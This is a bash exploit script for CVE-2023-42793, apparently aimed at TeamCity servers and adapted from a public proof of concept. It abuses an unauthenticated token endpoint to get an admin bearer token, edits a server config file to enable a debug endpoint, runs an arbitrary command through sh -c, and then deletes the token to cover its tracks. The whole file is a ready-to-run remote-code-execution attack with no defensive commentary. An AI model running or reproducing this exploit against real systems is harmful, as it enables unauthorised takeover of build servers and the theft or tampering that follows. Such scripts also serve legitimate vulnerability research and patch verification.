#!/bin/bash
# Author: Toby K
# Adapted from Zenmovie's original bash script - https://github.com/Zenmovie/CVE-2023-42793/commits/main/CVE-2023-42793_rce.sh
# Adds use of the 'params' parameter to support longer command lines, and base64 commands to prevent formatting issues

if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <base_url> <port> <command>"
    exit 1
fi

BASE_URL="$1"
PORT="$2"
COMMAND="$3"

TOKEN_ENDPOINT="${BASE_URL}:${PORT}/app/rest/users/id:1/tokens/RPC2"
EDIT_FILE_ENDPOINT="${BASE_URL}:${PORT}/admin/dataDir.html?action=edit&fileName=config/internal.properties&content=rest.debug.processes.enable=true"

URLCMD="`echo -n $COMMAND"| base64" |jq -sRr @uri`"
RCE_ENDPOINT="${BASE_URL}:${PORT}/app/rest/debug/processes?exePath=sh&params=-c&params=${URLCMD}"

echo "Executing command '$COMMAND'..."
echo ""
TOKEN_RESPONSE=$(curl -s -X POST "$TOKEN_ENDPOINT")
BEARER_TOKEN=$(echo "$TOKEN_RESPONSE" | grep -oP 'value="\K[^"]+')

curl -s -X POST "$EDIT_FILE_ENDPOINT" -H "Authorization: Bearer ${BEARER_TOKEN}"

RESPONSE=$(curl -s -X POST "$RCE_ENDPOINT" -H "Authorization: Bearer ${BEARER_TOKEN}" | tr -d '[:space:]' | awk 'BEGIN { FS = "StdOut:|StdErr:"} ; {print $2}')

curl -s -X DELETE "$TOKEN_ENDPOINT" -H "Authorization: Bearer ${BEARER_TOKEN}"

echo $RESPONSE | base64 -d
